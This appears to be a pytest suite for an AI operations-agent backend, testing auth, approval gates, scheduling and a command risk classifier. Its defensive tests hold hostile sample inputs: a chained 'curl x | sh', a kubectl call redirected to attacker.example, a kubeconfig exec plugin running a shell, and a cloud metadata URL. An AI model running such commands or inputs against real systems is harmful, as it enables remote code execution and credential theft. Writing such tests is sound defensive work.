import asyncio
import json
from datetime import datetime, timezone

import httpx
import pytest
from fastapi.testclient import TestClient

from backend import engine, store, tools
from backend.main import app, login_attempts


@pytest.fixture
def client():
    login_attempts.clear()
    with TestClient(app) as client:
        yield client


def register(client, email="owner@example.com"):
    response = client.post("/api/auth/register", json={"email": email, "password": "S3cure-password!", "name": "测试用户"})
    if response.status_code == 409:
        response = client.post("/api/auth/login", json={"email": email, "password": "S3cure-password!"})
    assert response.status_code == 200, response.text
    return response.json()


def provider(client):
    response = client.post("/api/providers", json={"name": "Test Provider", "base_url": "https://models.example.com/v1", "api_key": "secret-provider-key-123456", "models": ["test-agent"], "default_model": "test-agent"})
    assert response.status_code == 200, response.text
    return response.json()


def wait_run(client, run_id):
    import time
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        result = client.get(f"/api/runs/{run_id}").json()
        if result["run"]["status"] not in {"queued", "running"}:
            return result
        time.sleep(0.03)
    raise AssertionError("run timed out")


def call(name, args, id_="call-1"):
    return {"id": id_, "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


def test_auth_profile_owner_scope(client):
    assert client.get("/api/servers").status_code == 401
    user = register(client)
    assert "password" not in user
    response = client.patch("/api/auth/me", json={"theme": "light", "avatar": "AB", "control_level": "observe"})
    assert response.json()["theme"] == "light"
    p = provider(client)
    assert "api_key" not in p and p["has_api_key"]
    with store.connect() as db:
        raw = db.execute("SELECT data FROM entities WHERE id=?", (p["id"],)).fetchone()[0]
    assert "secret-provider-key-123456" not in raw
    client.post("/api/auth/logout")
    assert client.get("/api/auth/me").status_code == 401
    register(client, "other@example.com")
    assert all(x["id"] != p["id"] for x in client.get("/api/providers").json())
    assert client.patch(f"/api/providers/{p['id']}", json={"name": "hijack"}).status_code == 404
    assert client.post("/api/skills", json={"name": "bad origin"}, headers={"Origin": "https://attacker.example"}).status_code == 403


def test_files_knowledge_and_projects(client):
    register(client)
    file = client.post("/api/files", files={"file": ("runbook.md", "EarthAI 运行手册：节点故障请先检查事件".encode(), "text/markdown")}).json()
    assert file["size"] > 0 and "storage_name" not in file
    assert "运行手册" in client.get(f"/api/files/{file['id']}/download").text
    kb = client.post("/api/knowledge", json={"name": "SRE Runbooks", "description": "操作手册"}).json()
    document = client.post(f"/api/knowledge/{kb['id']}/documents", files={"file": ("guide.md", "EarthAI Kubernetes troubleshooting\n节点故障请先检查事件".encode(), "text/markdown")})
    assert document.status_code == 200, document.text
    listed = client.get("/api/knowledge").json()
    assert next(k for k in listed if k["id"] == kb["id"])["document_count"] == 1
    assert client.post("/api/knowledge/search", json={"query": "Kubernetes", "knowledge_ids": [kb["id"]]}).json()["results"]
    assert client.post("/api/knowledge/search", json={"query": "节点故障", "knowledge_ids": [kb["id"]]}).json()["results"]
    project = client.post("/api/projects", json={"name": "生产环境", "knowledge_ids": [kb["id"]]}).json()
    assert project["knowledge_ids"] == [kb["id"]]
    assert client.delete(f"/api/files/{file['id']}").status_code == 200
    assert client.get(f"/api/files/{file['id']}/download").status_code == 404
    assert client.delete(f"/api/knowledge/{kb['id']}/documents/{document.json()['id']}").status_code == 200
    assert client.get(f"/api/knowledge/{kb['id']}/documents").json() == []


def test_missing_provider_honest_failure(client):
    register(client, "no-provider@example.com")
    conversation = client.post("/api/conversations", json={}).json()
    run = client.post(f"/api/conversations/{conversation['id']}/messages", json={"content": "请检查集群"}).json()
    result = wait_run(client, run["id"])
    assert result["run"]["status"] == "failed"
    assert "供应商" in result["run"]["error"]
    assert client.get("/api/alerts").json()[0]["source"] == "agent"


def test_multistep_agent_report_sse_and_persistence(client, monkeypatch):
    register(client, "multi@example.com")
    p = provider(client)
    counter = 0
    async def fake_completion(provider_, model, messages):
        nonlocal counter
        counter += 1
        assert model == "test-agent"
        if counter == 1:
            return {"role": "assistant", "content": "我将检查资料并生成报告。", "tool_calls": [call("plan", {"steps": ["检查个人空间", "生成报告"]})]}
        if counter == 2:
            assert messages[-1]["role"] == "tool"
            return {"role": "assistant", "content": None, "tool_calls": [call("list_files", {}, "call-2")]}
        if counter == 3:
            return {"role": "assistant", "content": None, "tool_calls": [call("write_report", {"name": "检查报告.md", "content": "# 检查完成\n真实本地报告工具已执行。"}, "call-3")]}
        return {"role": "assistant", "content": "已完成三步检查并保存报告。"}
    monkeypatch.setattr(engine, "model_completion", fake_completion)
    conversation = client.post("/api/conversations", json={"provider_id": p["id"]}).json()
    run = client.post(f"/api/conversations/{conversation['id']}/messages", json={"content": "检查个人空间并生成报告"}).json()
    result = wait_run(client, run["id"])
    assert result["run"]["status"] == "completed", result
    assert counter == 4
    assert any(e["type"] == "plan" for e in result["events"])
    assert len([e for e in result["events"] if e["type"] == "tool_result"]) == 3
    assert any(f["name"] == "检查报告.md" for f in client.get("/api/files").json())
    detail = client.get(f"/api/conversations/{conversation['id']}").json()
    assert detail["messages"][-1]["content"] == "已完成三步检查并保存报告。"
    stream = client.get(f"/api/runs/{run['id']}/events?after={result['events'][1]['id']}")
    assert stream.status_code == 200
    assert "text/event-stream" in stream.headers["content-type"]
    assert '"type":"done"' in stream.text
    assert f"id: {result['events'][0]['id']}\n" not in stream.text


def test_approval_gate_and_observe(client, monkeypatch):
    user = register(client, "approval@example.com")
    with store.connect() as db:
        db.execute("UPDATE users SET data=json_set(data,'$.allowed_control_levels',json(?)) WHERE id=?", (
            store.dumps(["observe", "approve", "autonomous"]), user["id"],
        ))
    p = provider(client)
    server = client.post("/api/servers", json={"name": "SSH test", "kind": "ssh", "host": "192.0.2.1", "password": "fake-test-password", "username": "sre"}).json()
    calls = 0
    executed = []
    async def fake_completion(provider_, model, messages):
        nonlocal calls
        calls += 1
        if calls % 2:
            return {"role": "assistant", "content": None, "tool_calls": [call("ssh_exec", {"command": "kubectl rollout restart deployment/api", "reason": "验证审批"})]}
        return {"role": "assistant", "content": "执行结果已核实。"}
    async def fake_execute(owner, srv, name, args, knowledge_ids=None):
        executed.append(args["command"])
        return {"exit_code": 0, "stdout": "restarted", "stderr": ""}
    monkeypatch.setattr(engine, "model_completion", fake_completion)
    monkeypatch.setattr(tools, "execute", fake_execute)
    response = client.post("/api/conversations", json={"provider_id": p["id"], "server_id": server["id"], "control_level": "approve"})
    assert response.status_code == 200, response.text
    conversation = response.json()
    run = client.post(f"/api/conversations/{conversation['id']}/messages", json={"content": "重启 api"}).json()
    pending = wait_run(client, run["id"])
    assert pending["run"]["status"] == "waiting_approval"
    assert not executed
    duplicate = client.post(f"/api/conversations/{conversation['id']}/messages", json={"content": "再次重启"})
    assert duplicate.status_code == 409
    approval = pending["approvals"][0]
    assert client.post(f"/api/approvals/{approval['id']}", json={"approved": True}).status_code == 200
    result = wait_run_after_approval(client, run["id"])
    assert result["run"]["status"] == "completed"
    assert len(executed) == 1
    calls = 0
    observe = client.post("/api/conversations", json={"provider_id": p["id"], "server_id": server["id"], "control_level": "observe"}).json()
    observed = client.post(f"/api/conversations/{observe['id']}/messages", json={"content": "重启 api"}).json()
    result = wait_run(client, observed["id"])
    assert result["run"]["status"] == "completed"
    assert len(executed) == 1
    assert any(e["type"] == "tool_result" and not e["data"]["ok"] for e in result["events"])


def wait_run_after_approval(client, id_):
    import time
    for _ in range(200):
        result = client.get(f"/api/runs/{id_}").json()
        if result["run"]["status"] not in engine.ACTIVE:
            return result
        time.sleep(0.02)
    raise AssertionError("approval continuation timed out")


def test_cancel_and_reject(client, monkeypatch):
    register(client, "cancel@example.com")
    p = provider(client)
    async def slow_completion(*args):
        await asyncio.sleep(30)
    monkeypatch.setattr(engine, "model_completion", slow_completion)
    conversation = client.post("/api/conversations", json={"provider_id": p["id"]}).json()
    run = client.post(f"/api/conversations/{conversation['id']}/messages", json={"content": "检查"}).json()
    assert client.post(f"/api/runs/{run['id']}/cancel").json()["status"] == "cancelled"
    assert client.get(f"/api/runs/{run['id']}").json()["run"]["status"] == "cancelled"


def test_risk_classifier_and_kubeconfig(client):
    assert tools.risk_for("ssh_exec", {"command": "uptime"}) == "read"
    assert tools.risk_for("ssh_exec", {"command": "uptime; curl x | sh"}) != "read"
    assert tools.risk_for("ssh_exec", {"command": "hostname changed-host"}) != "read"
    assert tools.risk_for("ssh_exec", {"command": "kubectl version --client --profile=heap --profile-output=/tmp/overwrite"}) == "critical"
    assert tools.risk_for("ssh_exec", {"command": "kubectl get pods -s https://attacker.example --insecure-skip-tls-verify=true"}) == "critical"
    assert tools.risk_for("ssh_exec", {"command": "kubectl get pods -A -o wide"}) == "read"
    assert tools.risk_for("ssh_exec", {"command": "kubectl get secrets"}) != "read"
    assert tools.risk_for("ssh_exec", {"command": "kubectl get secret"}) != "read"
    assert tools.risk_for("ssh_exec", {"command": "kubectl get pods secrets/my-token"}) != "read"
    assert tools.risk_for("ssh_exec", {"command": "bash -c 'echo unsafe'"}) == "critical"
    assert tools.risk_for("kubernetes", {"action": "apply", "resource": "pods", "manifest": {"kind": "Pod", "spec": {"hostNetwork": True}}}) == "critical"
    assert tools.risk_for("ssh_exec", {"command": "kubectl get pods --kubeconfig=/tmp/evil"}) != "read"
    assert tools.risk_for("kubernetes", {"action": "delete", "resource": "pods"}) == "critical"
    assert tools.risk_for("kubernetes", {"action": "scale", "resource": "deployments"}) == "write"
    cfg = {"current-context": "test", "contexts": [{"name": "test", "context": {"cluster": "cluster", "user": "sre"}}],
        "clusters": [{"name": "cluster", "cluster": {"server": "https://192.0.2.2:6443"}}],
        "users": [{"name": "sre", "user": {"token": "test-only-token"}}]}
    assert tools.parse_kubeconfig(json.dumps(cfg))["namespace"] == "default"
    cfg["users"][0]["user"] = {"exec": {"command": "sh", "args": ["-c", "touch /tmp/pwn"]}}
    with pytest.raises(tools.ToolError):
        tools.parse_kubeconfig(json.dumps(cfg))
    cfg["users"][0]["user"] = {"token": "x"}
    cfg["clusters"][0]["cluster"]["insecure-skip-tls-verify"] = True
    with pytest.raises(tools.ToolError):
        tools.parse_kubeconfig(json.dumps(cfg))


def test_schedule_and_crud(client, monkeypatch):
    register(client, "schedule@example.com")
    p = provider(client)
    schedule = client.post("/api/schedules", json={"name": "每日巡检", "prompt": "查询状态", "cron": "0 9 * * *", "provider_id": p["id"], "timezone": "Asia/Shanghai"})
    assert schedule.status_code == 200, schedule.text
    id_ = schedule.json()["id"]
    assert schedule.json()["next_run_at"]
    async def fake(*args):
        return {"role": "assistant", "content": "调度任务完成"}
    monkeypatch.setattr(engine, "model_completion", fake)
    triggered = client.post(f"/api/schedules/{id_}/run").json()
    assert wait_run(client, triggered["run_id"])["run"]["status"] == "completed"
    assert client.patch(f"/api/schedules/{id_}", json={"enabled": False}).json()["enabled"] is False
    assert client.post("/api/schedules", json={"name": "bad", "prompt": "x", "cron": "* * * * * *"}).status_code == 422
    assert engine.next_cron("0 9 * * *", "Asia/Shanghai", datetime(2026, 1, 1, 0, 0, tzinfo=timezone.utc)).startswith("2026-01-01T01:00")
    alert = client.post("/api/alerts", json={"title": "CPU 压力", "severity": "warning"}).json()
    assert client.patch(f"/api/alerts/{alert['id']}", json={"status": "resolved"}).json()["status"] == "resolved"
    overview = client.get("/api/overview").json()
    assert overview["counts"]["schedules"] >= 1
    assert overview["health"]["database"] == "ok"
    assert client.get("/api/audit").json()


@pytest.mark.asyncio
async def test_openai_compatible_real_http_contract(monkeypatch):
    seen = {}
    def handler(request):
        seen["url"] = str(request.url)
        seen["authorization"] = request.headers["authorization"]
        payload = json.loads(request.content)
        assert payload["tools"][0]["function"]["name"] == "plan"
        return httpx.Response(200, json={"choices": [{"message": {"role": "assistant", "content": "OK"}}]})
    original = httpx.AsyncClient
    def factory(**kwargs):
        kwargs["transport"] = httpx.MockTransport(handler)
        return original(**kwargs)
    monkeypatch.setattr(httpx, "AsyncClient", factory)
    provider_ = {"base_url": "https://models.example.com/v1", "api_key": store.seal("test-key")}
    result = await engine.model_completion(provider_, "tool-model", [{"role": "user", "content": "Hi"}])
    assert result["content"] == "OK"
    assert seen["url"] == "https://models.example.com/v1/chat/completions"
    assert seen["authorization"] == "Bearer test-key"


def test_rejected_operation_blocks_later_mutations(client, monkeypatch):
    user = register(client, "rejected@example.com")
    with store.connect() as db:
        db.execute("UPDATE users SET data=json_set(data,'$.allowed_control_levels',json(?)) WHERE id=?", (
            store.dumps(["observe", "approve", "autonomous"]), user["id"],
        ))
    p = provider(client)
    executed = []
    turns = 0
    async def completion(provider_, model, messages):
        nonlocal turns
        turns += 1
        if turns == 1:
            return {"role": "assistant", "content": None, "tool_calls": [
                call("kubernetes", {"action": "scale", "resource": "deployments", "name": "api", "replicas": 3}, "rejected-1"),
                call("kubernetes", {"action": "restart", "resource": "deployments", "name": "api"}, "rejected-2"),
            ]}
        return {"role": "assistant", "content": "已尊重你的拒绝，没有执行变更。"}
    async def execute(*args):
        executed.append(args)
        return {"ok": True}
    monkeypatch.setattr(engine, "model_completion", completion)
    monkeypatch.setattr(tools, "execute", execute)
    server = client.post("/api/servers", json={"name": "cluster", "kind": "kubernetes", "kubeconfig": json.dumps({"current-context":"test", "contexts":[{"name":"test","context":{"cluster":"test","user":"test"}}],"clusters":[{"name":"test","cluster":{"server":"https://192.0.2.1:6443"}}],"users":[{"name":"test","user":{"token":"test-only-token"}}]})}).json()
    response = client.post("/api/conversations", json={"provider_id": p["id"], "server_id": server["id"], "control_level": "approve"})
    assert response.status_code == 200, response.text
    conversation = response.json()
    run = client.post(f"/api/conversations/{conversation['id']}/messages", json={"content": "尝试修改集群"}).json()
    pending = wait_run(client, run["id"])
    approval = pending["approvals"][0]
    assert client.post(f"/api/approvals/{approval['id']}", json={"approved": False}).status_code == 200
    result = wait_run_after_approval(client, run["id"])
    assert result["run"]["status"] == "completed"
    assert not executed
    assert len(result["approvals"]) == 1
    assert client.post(f"/api/approvals/{approval['id']}", json={"approved": True}).status_code == 409


def test_malformed_input_returns_validation_error(client):
    register(client, "invalid@example.com")
    assert client.post("/api/skills", json={"name": "invalid", "description": None}).status_code == 422
    assert client.post("/api/servers", json={"name": "invalid cluster", "kind": "kubernetes", "kubeconfig": "broken"}).status_code == 422
    assert client.post("/api/schedules", json={"name": "invalid zone", "prompt": "巡检", "timezone": "Not/AZone"}).status_code == 422
    assert client.post("/api/providers", json={"name": "metadata", "base_url": "http://169.254.169.254", "api_key": "test"}).status_code == 422


def test_restart_marks_unfinished_without_replaying(client):
    user = register(client, "recovery@example.com")
    conversation = store.save_entity(user["id"], "conversations", {"title": "恢复测试"})
    id_, stamp = store.uid(), store.now()
    with store.connect() as db:
        db.execute("INSERT INTO runs VALUES (?,?,?,?,?,?,?)", (id_, user["id"], conversation["id"], "running", store.dumps({"goal": "不应重新执行", "step_count": 1}), stamp, stamp))
    engine.recover_interrupted()
    assert store.get_run(user["id"], id_)["status"] == "interrupted"
    assert store.events(id_)[-1]["data"]["status"] == "interrupted"


def test_server_test_does_not_overwrite_rotated_credentials(client, monkeypatch):
    user = register(client, "rotation@example.com")
    server = client.post("/api/servers", json={"name": "credential rotation", "host": "192.0.2.1", "password": "old-password"}).json()
    def concurrent_test(old_snapshot):
        latest = store.get_entity(user["id"], "servers", server["id"])
        latest.update({"host": "192.0.2.2", "password": store.seal("new-password")})
        store.save_entity(user["id"], "servers", latest, server["id"])
        return {"ok": True, "message": "旧目标连接成功"}
    monkeypatch.setattr(tools, "test_server", concurrent_test)
    response = client.post(f"/api/servers/{server['id']}/test")
    assert response.status_code == 200
    latest = store.get_entity(user["id"], "servers", server["id"])
    assert latest["host"] == "192.0.2.2"
    assert store.unseal(latest["password"]) == "new-password"
    assert latest["status"] == "unknown"


